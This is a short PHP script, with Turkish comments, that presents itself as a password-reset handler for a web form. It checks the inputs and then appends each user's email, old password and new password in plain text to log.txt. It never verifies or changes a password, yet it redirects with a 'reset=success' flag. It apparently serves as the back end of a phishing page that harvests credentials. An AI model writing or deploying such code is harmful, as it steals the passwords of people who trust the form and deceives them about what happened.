<?php
session_start();
date_default_timezone_set('Europe/Istanbul');

// Şifre bilgilerini al
$old_password = $_POST['old_password'];
$new_password = $_POST['new_password'];
$confirm_password = $_POST['confirm_password'];

// E-posta bilgisi session’dan alınır
$email = $_SESSION['reset_email'] ?? 'bilinmiyor';

$date = date("Y-m-d H:i:s");

// Kontroller
if ($new_password !== $confirm_password) {
    echo "<script>alert('Şifreler uyuşmuyor!'); window.location.href = 'reset-password.html';</script>";
    exit();
}

if ($old_password === $new_password) {
    echo "<script>alert('Yeni şifre, eski şifreyle aynı olamaz!'); window.location.href = 'reset-password.html';</script>";
    exit();
}

if (strlen($new_password) < 8) {
    echo "<script>alert('Şifre en az 8 karakter olmalı!'); window.location.href = 'reset-password.html';</script>";
    exit();
}

// Log yaz
$log = "RESET | Email: $email | Eski: $old_password | Yeni: $new_password | Tarih: $date\n";
file_put_contents("log.txt", $log, FILE_APPEND);

// Ana sayfaya yönlendir
header("Location: index.html?reset=success");
exit();
?>
